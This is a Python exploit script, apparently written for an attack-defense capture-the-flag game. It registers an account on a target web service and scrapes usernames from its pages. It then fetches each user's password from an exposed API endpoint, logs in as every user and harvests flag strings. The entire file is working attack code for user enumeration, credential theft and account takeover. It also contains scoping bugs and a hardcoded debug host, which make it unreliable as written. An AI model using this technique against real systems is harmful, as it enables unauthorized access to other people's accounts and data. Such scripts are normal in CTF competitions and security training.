#!/usr/bin/env python3

import requests
import sys
import re
import random
import json
import hashlib

flagRegEx = "[2-7A-Z]{31}="

our_host = "10.80.3.2"		# define out host
port = 37000 				# define port of service

alph = 'qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM0123456789'

# POST requests
# data = { 'key':'value', 'key1':'value1' }
# res = requests.post( host + "some-url", data=data )

def md5(data): return hashlib.md5(data).hexdigest()
def sha1(data): return hashlib.sha1(data).hexdigest()
def sha256(data): return hashlib.sha256(data).hexdigest()

def main():
	
	# do not forgot about strip(), split(), replace() - functions to parsing

	host = "10.80.4.2"		# DEBUG mode
	url = host = 'http://{}:{}/'.format(host, port)
	
	u_name = idgen(8)
	u_pswd = idgen(12)

	# print(u_name, u_pswd)

	register(u_name, u_pswd)
	s = login(u_name, u_pswd)
	logins = get_logins(s)

	# print(logins)

	for u_name in logins:

		u_pswd = get_password(u_name)

		s = login(u_name, u_pswd)
		home = s.get(url).text
		flag_list = re.findall( flagRegEx, home )
		
		print(*flag_list, sep="\n", flush=True)
		sys.stdout.flush() # after print


def idgen( size = 8, chars=alph ):
	return ''.join( random.choice( chars ) for _ in range( size ) )


def register(u_name: str, u_pswd: str):
	resp = requests.post(url+"api/register", json={"login":u_name,"password":u_pswd}).text


def login(u_name: str, u_pswd: str):
	s = requests.Session()
	resp = s.post(url+"api/login", json={"login":u_name,"password":u_pswd}).text
	return s


def get_logins(s):
	logins = []
	for i in range(1, 17):
		resp = s.get(url+f"specific.html?img={str(i).zfill(2)}")
		logins += re.findall('<div class="title h5" style="margin: 20px"><b>(.*)</b></div>', resp.text)
	return logins


def get_password(u_name):
	data = json.loads(s.get('http://'+host+":"+str(37002)+f"/users/{u_name}/password").text)
	return data['data']


if __name__ == '__main__':
	
	if len(sys.argv) > 1:
		host = sys.argv[1]
	else:
		print("Usage python3 " + sys.argv[0] + " <host>")
		sys.exit(-1)
	
	if host == our_host:
		sys.exit(-4)
	
	main()
